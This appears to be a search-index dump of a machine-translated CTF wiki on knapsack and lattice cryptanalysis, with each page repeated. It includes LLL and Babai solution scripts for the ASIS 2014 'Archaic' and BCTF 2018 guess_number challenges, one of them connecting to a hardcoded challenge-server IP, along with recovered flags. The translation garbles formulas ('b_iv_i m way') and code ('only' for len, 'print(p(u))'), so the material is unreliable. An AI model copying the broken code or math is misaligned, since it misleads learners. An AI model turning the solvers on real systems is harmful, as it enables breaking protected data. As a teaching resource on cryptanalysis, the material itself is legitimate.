Merkle\u2013Hellman \u00b6 Public private key generation \u00b6 Generating a private key \u00b6 The private key is our initial backpack set. Here we use the super-increment sequence, how to generate it? We can assume that a_1=1 a_1=1 , then a_2 a_2 is greater than 1, and similarly can generate subsequent values in turn. Generating a public key \u00b6 In the process of generating a public key, the operation of modular multiplication is mainly used. First, we generate the modulus m of the modular multiplication, here we want to make sure $$ m>\\sum_{i=1}^{i=n}a_i $$ Second, we choose the multiplier w of the modular multiplication as the private key and ensure $$ gcd(w,m)=1 $$ After that, we can generate the public key by the following formula. $$ b_i \\equiv w a_i \\bmod m $$ And this new backpack set b_i b_i and m as the public key. encryption and decryption \u00b6 Encryption \u00b6 Suppose we want to encrypt the plaintext as v, each bit is v_i v_i , then the result of our encryption is $$ Sum_ {i = 1} ^ {n} i = b_iv_i m way $$ Decryption \u00b6 For the decryption side, we can first ask for the inverse of m^{-1} m^{-1} for m. Then we can multiply the obtained ciphertext by w^{-1} w^{-1} to get the plaintext, because $$ Sum_ {i = 1} ^ {w} i = n ^ {- 1} b_iv_i way m = sum_ {i = 1} ^ {n} i = a_iv_i m way $$ here has $$ b_i \\equiv w a_i \\bmod m $$ The encrypted message for each block is less than m, so the result is naturally plaintext. \u7834 \u00b6 The system was deciphered two years after the proposed encryption system. The basic idea of deciphering is that we do not necessarily need to find the correct multiplier w (ie trapdoor information), just find the arbitrary modulus m&#39; and The multiplier w&#39; can be used to generate a super-incrementing backpack vector by using w&#39; to multiply the public backpack vector B. Examples \u00b6 Here we take Archaic in 2014 ASIS Cyber Security Contest Quals as an example, [topic link] ( https://github.com/ctfs/write-ups-2014/tree/b02bcbb2737907dd0aa39c5d4df1d1e270958f54/asis-ctf-quals-2014/archaic ). First look at the source program secret = 'CENSORED' msg_bit = bin ( int ( secret . encode ( 'hex' ), 16 ))[ 2 :] First we get all the bits of secret. Second, use the following function to get the keypair, including the public and private keys. keyPair = makeKey ( curtain ( msg_bit )) Carefully analyze the makekey function as follows def makeKey ( n ): privKey = [ random . randint ( 1 , 4 ** n )] s = privKey [ 0 ] for i in range ( 1 , n ): privKey . append ( random . randint ( s + 1 , 4 ** ( n + i ))) s + = privKey [ i ] q = random . randint ( privKey [ n - 1 ] + 1 , 2 * privKey [ n - 1 ]) r = random . randint ( 1 , q ) while gmpy2 . gcd ( r , q ) != 1 : r = random . randint ( 1 , q ) pubKey = [ r * w % q for w in privKey ] return privKey , q , r , pubKey It can be seen that prikey is a super-incremental sequence, and the obtained q is larger than the sum of all the numbers in prikey. In addition, we get r, which is exactly the same as q, which indicates that the encryption is a backpack encryption. Sure enough, the encryption function is to multiply each bit of the message by the corresponding public key and sum. def encrypt ( msg , pubKey ): msg_bit = msg n = only ( pubKey ) cipher = 0 i = 0 for bit in msg_bit : cipher += int ( bit ) * pubKey [ i ] i += 1 return bin ( cipher )[ 2 :] For the cracked script we use the script on [GitHub] ( https://github.com/ctfs/write-ups-2014/tree/b02bcbb2737907dd0aa39c5d4df1d1e270958f54/asis-ctf-quals-2014/archaic ). Make some simple modifications. import binascii # open the public key and strip the spaces so we have a decent array fileKey = open ( & quot ; pub . Key & quot ;, & #39;rb&#39;) pubKey = fileKey . read () . replace ( ' ' , '' ) . replace ( 'L' , '' ) . strip ( '[]' ) . split ( ',' ) nbit = only ( pubKey ) # open the encoded message fileEnc = open ( & quot ; enc . txt & quot ;, & #39;rb&#39;) encoded = fileEnc . read () . replace ( 'L' , '' ) print \"start\" # create a large matrix of 0's (dimensions are public key length +1) A = Matrix ( ZZ , nbit + 1 , nbit + 1 ) # fill in the identity matrix for i in xrange ( nbit ): A [ i , i ] = 1 # replace the bottom row with your public key for i in xrange ( nbit ): A [ i , nbit ] = pubKey [ i ] # last element is the encoded message A [ nbit , nbit ] = - int ( encoded ) res = A . LLL () for i in range ( 0 , nbit + 1 ): # print solution M = res . row ( i ) . list () flag = True for m in M : if m != 0 and m != 1 : flag = False break if flag : print i , M M = '' . join ( str ( j ) for j in M ) # remove the last bit M = M [: - 1 ] M = hex ( int ( M , 2 ))[ 2 : - 1 ] print M Decoded after output 295 [ 1 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 ] 415349535 f3962643364356664323432323638326331393536383830366130373036316365 & gt ; & gt ; & gt ; import binascii >>> binascii . unhexlify ( '415349535f3962643364356664323432323638326331393536383830366130373036316365' ) & #39;ASIS_9bd3d5fd2422682c19568806a07061ce&#39; It should be noted that the matrix of res obtained by the LLL attack we only contains the 01 value is the result we want, because when we encrypt the plaintext, it will be decomposed into binary bit strings. In addition, we need to remove the last number of the corresponding row. flag \u662f ASIS_9bd3d5fd2422682c19568806a07061ce \u3002 Title \u00b6 2017 national classic","title":"Knapsack Cipher"},{"location":"crypto/asymmetric/knapsack/knapsack/#backpack-problem","text":"First, let's introduce the backpack problem. Suppose a backpack can weigh W. Now there are n items with weights of a_1, a_2,..., a_n a_1, a_2,..., a_n . We want to ask which items can fit the backpack. Filled up and each item can only be loaded once. This is actually solving such a problem. $$ x_1a_1 + x_2a_2 +, ..., + x_na_n = W $$ All of these x_i x_i can only be 0 and 1. Obviously we have to enumerate all the combinations of n items to solve this problem, and the complexity is 2^n 2^n , which is the beauty of backpack encryption. When encrypting, if we want to encrypt the plaintext as x, then we can represent it as an n-bit binary number and then multiply it by a_i a_i to get the encrypted result. But what should I do when decrypting? We did make it difficult for others to decrypt the ciphertext, but we really have no way to decrypt the ciphertext. But when a_i a_i is super-incremental, we have a solution. The so-called super-increment means that the sequence satisfies the following conditions. $$ a_i>\\sum_{k=1}^{i-1}a_k $$ That is, the ith number is greater than the sum of all the previous numbers. Why can you decrypt it if you meet such a condition? This is because if the encrypted result is greater than a_n a_n , the preceding coefficient must be 1. On the contrary, the equation cannot be established anyway. Therefore, we can get the corresponding plaintext immediately. However, this has another problem. Since a_i a_i is public, if the attacker intercepts the ciphertext, it is easy to crack such a password. In order to make up for this problem, an encryption algorithm such as Merkle\u2013Hellman appears. We can use the initial backpack set as the private key, the transformed backpack set as the public key, and then slightly change the encryption process. Although the super-increment sequence is mentioned here, it is not said how it is generated.","title":"Backpack problem"},{"location":"crypto/asymmetric/knapsack/knapsack/#merklehellman","text":"","title":"Merkle\u2013Hellman"},{"location":"crypto/asymmetric/knapsack/knapsack/#public-private-key-generation","text":"","title":"Public private key generation"},{"location":"crypto/asymmetric/knapsack/knapsack/#generating-a-private-key","text":"The private key is our initial backpack set. Here we use the super-increment sequence, how to generate it? We can assume that a_1=1 a_1=1 , then a_2 a_2 is greater than 1, and similarly can generate subsequent values in turn.","title":"Generating a private key"},{"location":"crypto/asymmetric/knapsack/knapsack/#generating-a-public-key","text":"In the process of generating a public key, the operation of modular multiplication is mainly used. First, we generate the modulus m of the modular multiplication, here we want to make sure $$ m>\\sum_{i=1}^{i=n}a_i $$ Second, we choose the multiplier w of the modular multiplication as the private key and ensure $$ gcd(w,m)=1 $$ After that, we can generate the public key by the following formula. $$ b_i \\equiv w a_i \\bmod m $$ And this new backpack set b_i b_i and m as the public key.","title":"Generating a public key"},{"location":"crypto/asymmetric/knapsack/knapsack/#encryption-and-decryption","text":"","title":"encryption and decryption"},{"location":"crypto/asymmetric/knapsack/knapsack/#encryption","text":"Suppose we want to encrypt the plaintext as v, each bit is v_i v_i , then the result of our encryption is $$ Sum_ {i = 1} ^ {n} i = b_iv_i m way $$","title":"Encryption"},{"location":"crypto/asymmetric/knapsack/knapsack/#decryption","text":"For the decryption side, we can first ask for the inverse of m^{-1} m^{-1} for m. Then we can multiply the obtained ciphertext by w^{-1} w^{-1} to get the plaintext, because $$ Sum_ {i = 1} ^ {w} i = n ^ {- 1} b_iv_i way m = sum_ {i = 1} ^ {n} i = a_iv_i m way $$ here has $$ b_i \\equiv w a_i \\bmod m $$ The encrypted message for each block is less than m, so the result is naturally plaintext.","title":"Decryption"},{"location":"crypto/asymmetric/knapsack/knapsack/#_1","text":"The system was deciphered two years after the proposed encryption system. The basic idea of deciphering is that we do not necessarily need to find the correct multiplier w (ie trapdoor information), just find the arbitrary modulus m&#39; and The multiplier w&#39; can be used to generate a super-incrementing backpack vector by using w&#39; to multiply the public backpack vector B.","title":"\u7834"},{"location":"crypto/asymmetric/knapsack/knapsack/#examples","text":"Here we take Archaic in 2014 ASIS Cyber Security Contest Quals as an example, [topic link] ( https://github.com/ctfs/write-ups-2014/tree/b02bcbb2737907dd0aa39c5d4df1d1e270958f54/asis-ctf-quals-2014/archaic ). First look at the source program secret = 'CENSORED' msg_bit = bin ( int ( secret . encode ( 'hex' ), 16 ))[ 2 :] First we get all the bits of secret. Second, use the following function to get the keypair, including the public and private keys. keyPair = makeKey ( curtain ( msg_bit )) Carefully analyze the makekey function as follows def makeKey ( n ): privKey = [ random . randint ( 1 , 4 ** n )] s = privKey [ 0 ] for i in range ( 1 , n ): privKey . append ( random . randint ( s + 1 , 4 ** ( n + i ))) s + = privKey [ i ] q = random . randint ( privKey [ n - 1 ] + 1 , 2 * privKey [ n - 1 ]) r = random . randint ( 1 , q ) while gmpy2 . gcd ( r , q ) != 1 : r = random . randint ( 1 , q ) pubKey = [ r * w % q for w in privKey ] return privKey , q , r , pubKey It can be seen that prikey is a super-incremental sequence, and the obtained q is larger than the sum of all the numbers in prikey. In addition, we get r, which is exactly the same as q, which indicates that the encryption is a backpack encryption. Sure enough, the encryption function is to multiply each bit of the message by the corresponding public key and sum. def encrypt ( msg , pubKey ): msg_bit = msg n = only ( pubKey ) cipher = 0 i = 0 for bit in msg_bit : cipher += int ( bit ) * pubKey [ i ] i += 1 return bin ( cipher )[ 2 :] For the cracked script we use the script on [GitHub] ( https://github.com/ctfs/write-ups-2014/tree/b02bcbb2737907dd0aa39c5d4df1d1e270958f54/asis-ctf-quals-2014/archaic ). Make some simple modifications. import binascii # open the public key and strip the spaces so we have a decent array fileKey = open ( & quot ; pub . Key & quot ;, & #39;rb&#39;) pubKey = fileKey . read () . replace ( ' ' , '' ) . replace ( 'L' , '' ) . strip ( '[]' ) . split ( ',' ) nbit = only ( pubKey ) # open the encoded message fileEnc = open ( & quot ; enc . txt & quot ;, & #39;rb&#39;) encoded = fileEnc . read () . replace ( 'L' , '' ) print \"start\" # create a large matrix of 0's (dimensions are public key length +1) A = Matrix ( ZZ , nbit + 1 , nbit + 1 ) # fill in the identity matrix for i in xrange ( nbit ): A [ i , i ] = 1 # replace the bottom row with your public key for i in xrange ( nbit ): A [ i , nbit ] = pubKey [ i ] # last element is the encoded message A [ nbit , nbit ] = - int ( encoded ) res = A . LLL () for i in range ( 0 , nbit + 1 ): # print solution M = res . row ( i ) . list () flag = True for m in M : if m != 0 and m != 1 : flag = False break if flag : print i , M M = '' . join ( str ( j ) for j in M ) # remove the last bit M = M [: - 1 ] M = hex ( int ( M , 2 ))[ 2 : - 1 ] print M Decoded after output 295 [ 1 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 ] 415349535 f3962643364356664323432323638326331393536383830366130373036316365 & gt ; & gt ; & gt ; import binascii >>> binascii . unhexlify ( '415349535f3962643364356664323432323638326331393536383830366130373036316365' ) & #39;ASIS_9bd3d5fd2422682c19568806a07061ce&#39; It should be noted that the matrix of res obtained by the LLL attack we only contains the 01 value is the result we want, because when we encrypt the plaintext, it will be decomposed into binary bit strings. In addition, we need to remove the last number of the corresponding row. flag \u662f ASIS_9bd3d5fd2422682c19568806a07061ce \u3002","title":"Examples"},{"location":"crypto/asymmetric/knapsack/knapsack/#title","text":"2017 national classic","title":"Title"},{"location":"crypto/asymmetric/lattice/cvp/","text":"CVP \u00b6 CVP is a particularly important issue in Lattice-based cryptography. The basic definition of the problem is as follows: Given a set of bases and vectors \\mathbf{v} \\mathbf{v} for L L , find the nearest vector to \\mathbf{v} \\mathbf{v} on L L . Algorithms \u00b6 Babai's nearest plane algorithm \u00b6 The algorithm inputs a set of lattice L L (rank is n n ) base B B and a target vector \\mathbf{t} \\mathbf{t} to output an approximate solution to the CVP problem. The approximation factor is \\gamma = 2^{\\frac{n}{2}} \\gamma = 2^{\\frac{n}{2}} Specific algorithm: where c_j c_j is the rounding of the coefficients in the Gram-schmidt orthogonalization, which is the rounding of proj_{b_{j}}(b) proj_{b_{j}}(b) . For the personal understanding of the second step of the algorithm: find a linear combination closest to \\mathbf{t} \\mathbf{t} in the base B B after the lattice basis and the orthogonalization. Babai\u2019s Rounding Technique \u00b6 This algorithm is a variant of Babai&#39;s nearest plane algorithm . The steps can be expressed as: N = rank(B), w = target - B' = LLL(B) - Find a linear combination [l_0, ... l_N] such that w = sum(l_i * b'_i). * (b'_i is the i-th vector in the LLL-reduced basis B') - Round each l_i to it's closest integer l'_i. - Result v = sum(l'_i * b'_i) related information \u00b6 Hidden number problem \u00b6 The definition of HNP is as follows: Given the prime p p , many t \\in \\mathbb{F}_p t \\in \\mathbb{F}_p and each corresponding MSB_{l,p}(\\alpha t) MSB_{l,p}(\\alpha t) , find the corresponding \\alpha \\alpha . MSB_{l,p}(x) MSB_{l,p}(x) means any integer $u that satisfies \\lvert (x \\mod p) - u \\rvert \\le \\frac{p}{2^{l+1}} \\lvert (x \\mod p) - u \\rvert \\le \\frac{p}{2^{l+1}} $, which is approximately l l most significant digits of x \\mod p x \\mod p . According to the description in Reference 3, when l \\approx \\log^{\\frac{1}{2}}{p} l \\approx \\log^{\\frac{1}{2}}{p} , the following algorithm can solve HNP: We can turn this problem into a CVP problem on the lattice generated by the matrix: \\left[ \\begin{matrix} p & 0 & \\dots & 0 & 0 \\\\ 0 & p & \\ddots & \\vdots & \\vdots \\\\ \\vdots & \\ddots & \\ddots & 0 & \\vdots \\\\ 0 & 0 & \\dots & p & 0 \\\\ t_1 & t_2 & \\dots & t_{n} & \\frac{1}{2^{l+1}} \\end{matrix} \\right] \\left[ \\begin{matrix} p & 0 & \\dots & 0 & 0 \\\\ 0 & p & \\ddots & \\vdots & \\vdots \\\\ \\vdots & \\ddots & \\ddots & 0 & \\vdots \\\\ 0 & 0 & \\dots & p & 0 \\\\ t_1 & t_2 & \\dots & t_{n} & \\frac{1}{2^{l+1}} \\end{matrix} \\right] We need to find the nearest vector from \\mathbf{u}=(u_1, u_2, \\dots, u_{n}, 0) \\mathbf{u}=(u_1, u_2, \\dots, u_{n}, 0) on the lattice, so here we can use Babai&#39;s nearest plane algorithm . Finally we can get a set of vectors \\mathbf{v}=(\\alpha \\cdot t_1 \\mod p, \\alpha \\cdot t_2 \\mod p, \\dots, \\frac{\\alpha}{2^{l+1} }) \\mathbf{v}=(\\alpha \\cdot t_1 \\mod p, \\alpha \\cdot t_2 \\mod p, \\dots, \\frac{\\alpha}{2^{l+1} }) , which calculates \\alpha \\alpha . BCTF 2018 - guess_number \u00b6 The topic provides server-side code: import random , sys from flag import FLAG import gmpy2 def msb ( k , x , p ): delta = p & gt ; & gt ; ( k + 1 ) ui = random . randint ( x - delta , x + delta ) return ui def main (): p = gmpy2 . next_prime ( 2 ** 160 ) for _ in range ( 5 ): alpha = random . randint ( 1 , p - 1 ) # print(alpha) t = [] u = [] k = 10 for i in range ( 22 ): t . append ( random . randint ( 1 , p - 1 )) u . append ( msb ( k , alpha * t [ i ] % p , p )) print ( str ( t )) print ( p ( u )) guess = raw_input ( 'Input your guess number: ' ) guess = int ( guess ) if guess != alpha : exit ( 0 ) if __name__ == \"__main__\" : main () print ( FLAG ) As you can see, the program performs a total of 5 rounds. In each round, the program generates a random \\alpha \\alpha and 22 random t_i t_i . For each t_i t_i , the program will take u_i = MSB_{10,p}(\\alpha\\cdot{t_i\\mod{p}}) u_i = MSB_{10,p}(\\alpha\\cdot{t_i\\mod{p}}) and send it to the client. We need to calculate the corresponding \\alpha \\alpha based on the provided t_i t_i and u_i u_i . As you can see, the problem is a typical Hidden number problem, so you can use the above algorithm to solve: import socket import ast import telnetlib #HOST, PORT = 'localhost', 9999 HOST , PORT = '60.205.223.220' , 9999 s = socket . socket () s . connect (( HOST , PORT )) f = s . makefile ( 'rw' , 0 ) def recv_until ( f , delim = ' \\n ' ): buf = & #39;&#39; while not buf . endswith ( delim ): buf += f . read ( 1 ) return buf p = 1461501637330902918203684832716283019655932542983 k = 10 def solve_hnp ( t , u ): # http://www.isg.rhul.ac.uk/~sdg/igor-slides.pdf M = Matrix ( RationalField (), 23 , 23 ) for i in xrange ( 22 ): M [ i , i ] = p M [ 22 , i ] = t [ i ] M [ 22 , 22 ] = 1 / ( 2 ** ( k + 1 )) def babai ( A , w ): A = A . LLL ( delta = 0.75 ) G = A . gram_schmidt ()[ 0 ] t = w for i in reversed ( range ( A . nrows ())): c = (( t * G [ i ]) / ( G [ i ] * G [ i ])) . round () t -= A [ i ] * c return w - t closest = babai ( M , vector ( u + [ 0 ])) return ( closest [ - 1 ] * ( 2 ** ( k + 1 ))) % p for i in xrange ( 5 ): t = ast . literal_eval ( f . readline () . strip ()) u = ast . literal_eval ( f . readline () . strip ()) alpha = solve_hnp ( t , u ) recv_until ( f , 'number: ' ) s . send ( str ( alpha ) + ' \\n ' ) t = telnetlib . Telnet () t . sock = s t . interact () Reference \u00b6 Lecture 3 - CVP algorithm Wikipedia Playing \u201cHide-and-Seek\u201d in Finite Fields: Hidden Number Problem and Its Applications https://www.math.auckland.ac.nz/~sgal018/crypto-book/ch18.pdf","title":"CVP"},{"location":"crypto/asymmetric/lattice/cvp/#cvp","text":"CVP is a particularly important issue in Lattice-based cryptography. The basic definition of the problem is as follows: Given a set of bases and vectors \\mathbf{v} \\mathbf{v} for L L , find the nearest vector to \\mathbf{v} \\mathbf{v} on L L .","title":"CVP"},{"location":"crypto/asymmetric/lattice/cvp/#algorithms","text":"","title":"Algorithms"},{"location":"crypto/asymmetric/lattice/cvp/#babais-nearest-plane-algorithm","text":"The algorithm inputs a set of lattice L L (rank is n n ) base B B and a target vector \\mathbf{t} \\mathbf{t} to output an approximate solution to the CVP problem. The approximation factor is \\gamma = 2^{\\frac{n}{2}} \\gamma = 2^{\\frac{n}{2}} Specific algorithm: where c_j c_j is the rounding of the coefficients in the Gram-schmidt orthogonalization, which is the rounding of proj_{b_{j}}(b) proj_{b_{j}}(b) . For the personal understanding of the second step of the algorithm: find a linear combination closest to \\mathbf{t} \\mathbf{t} in the base B B after the lattice basis and the orthogonalization.","title":"Babai's nearest plane algorithm"},{"location":"crypto/asymmetric/lattice/cvp/#babais-rounding-technique","text":"This algorithm is a variant of Babai&#39;s nearest plane algorithm . The steps can be expressed as: N = rank(B), w = target - B' = LLL(B) - Find a linear combination [l_0, ... l_N] such that w = sum(l_i * b'_i). * (b'_i is the i-th vector in the LLL-reduced basis B') - Round each l_i to it's closest integer l'_i. - Result v = sum(l'_i * b'_i)","title":"Babai\u2019s Rounding Technique"},{"location":"crypto/asymmetric/lattice/cvp/#related-information","text":"","title":"related information"},{"location":"crypto/asymmetric/lattice/cvp/#hidden-number-problem","text":"The definition of HNP is as follows: Given the prime p p , many t \\in \\mathbb{F}_p t \\in \\mathbb{F}_p and each corresponding MSB_{l,p}(\\alpha t) MSB_{l,p}(\\alpha t) , find the corresponding \\alpha \\alpha . MSB_{l,p}(x) MSB_{l,p}(x) means any integer $u that satisfies \\lvert (x \\mod p) - u \\rvert \\le \\frac{p}{2^{l+1}} \\lvert (x \\mod p) - u \\rvert \\le \\frac{p}{2^{l+1}} $, which is approximately l l most significant digits of x \\mod p x \\mod p . According to the description in Reference 3, when l \\approx \\log^{\\frac{1}{2}}{p} l \\approx \\log^{\\frac{1}{2}}{p} , the following algorithm can solve HNP: We can turn this problem into a CVP problem on the lattice generated by the matrix: \\left[ \\begin{matrix} p & 0 & \\dots & 0 & 0 \\\\ 0 & p & \\ddots & \\vdots & \\vdots \\\\ \\vdots & \\ddots & \\ddots & 0 & \\vdots \\\\ 0 & 0 & \\dots & p & 0 \\\\ t_1 & t_2 & \\dots & t_{n} & \\frac{1}{2^{l+1}} \\end{matrix} \\right] \\left[ \\begin{matrix} p & 0 & \\dots & 0 & 0 \\\\ 0 & p & \\ddots & \\vdots & \\vdots \\\\ \\vdots & \\ddots & \\ddots & 0 & \\vdots \\\\ 0 & 0 & \\dots & p & 0 \\\\ t_1 & t_2 & \\dots & t_{n} & \\frac{1}{2^{l+1}} \\end{matrix} \\right] We need to find the nearest vector from \\mathbf{u}=(u_1, u_2, \\dots, u_{n}, 0) \\mathbf{u}=(u_1, u_2, \\dots, u_{n}, 0) on the lattice, so here we can use Babai&#39;s nearest plane algorithm . Finally we can get a set of vectors \\mathbf{v}=(\\alpha \\cdot t_1 \\mod p, \\alpha \\cdot t_2 \\mod p, \\dots, \\frac{\\alpha}{2^{l+1} }) \\mathbf{v}=(\\alpha \\cdot t_1 \\mod p, \\alpha \\cdot t_2 \\mod p, \\dots, \\frac{\\alpha}{2^{l+1} }) , which calculates \\alpha \\alpha .","title":"Hidden number problem"},{"location":"crypto/asymmetric/lattice/cvp/#bctf-2018-guess_number","text":"The topic provides server-side code: import random , sys from flag import FLAG import gmpy2 def msb ( k , x , p ): delta = p & gt ; & gt ; ( k + 1 ) ui = random . randint ( x - delta , x + delta ) return ui def main (): p = gmpy2 . next_prime ( 2 ** 160 ) for _ in range ( 5 ): alpha = random . randint ( 1 , p - 1 ) # print(alpha) t = [] u = [] k = 10 for i in range ( 22 ): t . append ( random . randint ( 1 , p - 1 )) u . append ( msb ( k , alpha * t [ i ] % p , p )) print ( str ( t )) print ( p ( u )) guess = raw_input ( 'Input your guess number: ' ) guess = int ( guess ) if guess != alpha : exit ( 0 ) if __name__ == \"__main__\" : main () print ( FLAG ) As you can see, the program performs a total of 5 rounds. In each round, the program generates a random \\alpha \\alpha and 22 random t_i t_i . For each t_i t_i , the program will take u_i = MSB_{10,p}(\\alpha\\cdot{t_i\\mod{p}}) u_i = MSB_{10,p}(\\alpha\\cdot{t_i\\mod{p}}) and send it to the client. We need to calculate the corresponding \\alpha \\alpha based on the provided t_i t_i and u_i u_i . As you can see, the problem is a typical Hidden number problem, so you can use the above algorithm to solve: import socket import ast import telnetlib #HOST, PORT = 'localhost', 9999 HOST , PORT = '60.205.223.220' , 9999 s = socket . socket () s . connect (( HOST , PORT )) f = s . makefile ( 'rw' , 0 ) def recv_until ( f , delim = ' \\n ' ): buf = & #39;&#39; while not buf . endswith ( delim ): buf += f . read ( 1 ) return buf p = 1461501637330902918203684832716283019655932542983 k = 10 def solve_hnp ( t , u ): # http://www.isg.rhul.ac.uk/~sdg/igor-slides.pdf M = Matrix ( RationalField (), 23 , 23 ) for i in xrange ( 22 ): M [ i , i ] = p M [ 22 , i ] = t [ i ] M [ 22 , 22 ] = 1 / ( 2 ** ( k + 1 )) def babai ( A , w ): A = A . LLL ( delta = 0.75 ) G = A . gram_schmidt ()[ 0 ] t = w for i in reversed ( range ( A . nrows ())): c = (( t * G [ i ]) / ( G [ i ] * G [ i ])) . round () t -= A [ i ] * c return w - t closest = babai ( M , vector ( u + [ 0 ])) return ( closest [ - 1 ] * ( 2 ** ( k + 1 ))) % p for i in xrange ( 5 ): t = ast . literal_eval ( f . readline () . strip ()) u = ast . literal_eval ( f . readline () . strip ()) alpha = solve_hnp ( t , u ) recv_until ( f , 'number: ' ) s . send ( str ( alpha ) + ' \\n ' ) t = telnetlib . Telnet () t . sock = s t . interact ()","title":"BCTF 2018 - guess_number"},{"location":"crypto/asymmetric/lattice/cvp/#reference","text":"Lecture 3 - CVP algorithm Wikipedia Playing \u201cHide-and-Seek\u201d in Finite Fields: Hidden Number Problem and Its Applications https://www.math.auckland.ac.nz/~sgal018/crypto-book/ch18.pdf","title":"Reference"},{"location":"crypto/asymmetric/lattice/introduction/","text":"Basic Introduction \u00b6 Lattice Definition \u00b6 The lattice is the linear combination of all integer coefficients of n ( m\\geq n m\\geq n ) linearly independent vectors b_i(1\\leq i \\leq n) b_i(1\\leq i \\leq n) of the m-dimensional Euclidean space R^m R^m , ie L(B)=\\{\\sum\\limits_{i=1}^{n}x_ib_i:x_i \\in Z,1\\leq i \\leq n\\} L(B)=\\{\\sum\\limits_{i=1}^{n}x_ib_i:x_i \\in Z,1\\leq i \\leq n\\} Here B is a collection of n vectors, we call These n n vectors a set of bases of the lattice L L . The rank of the lattice L L is n n . The number of bits in L L is m m . If m = n m = n , then we call this format full rank. Of course, the space can be other groups instead of R^m R^m . Basic Definition in Lattices \u00b6 Successive Minimum \u00b6 Let lattice L L be a lattice in the m-dimensional Euclidean space R^m R^m with rank n n , then the continuous minimum length of L L (successive minima) is \\lambda_1,...,\\lambda_n \\in R \\lambda_1,...,\\lambda_n \\in R , where for any 1 \\leq i\\leq n 1 \\leq i\\leq n , \\lambda_i \\lambda_i is the minimum value to satisfy that for i i linearly independent vectors v_i v_i , ||v_j||\\leq \\lambda_i,1\\leq j\\leq i ||v_j||\\leq \\lambda_i,1\\leq j\\leq i . Obviously we have \\lambda_i \\leq \\lambda_j ,\\forall i <j \\lambda_i \\leq \\lambda_j ,\\forall i <j \u3002 Calculating Difficult Problems in the Lattice \u00b6 Shortest Vector Problem (SVP) : Given the lattice L and its base vector B, find the non-zero vector v in the lattice L such that for any other non-zero vector u in the lattice, ||v| | \\leq ||u|| ||v| | \\leq ||u|| . \\gamma \\gamma -Approximate Shortest Vector Problem (SVP- \\gamma 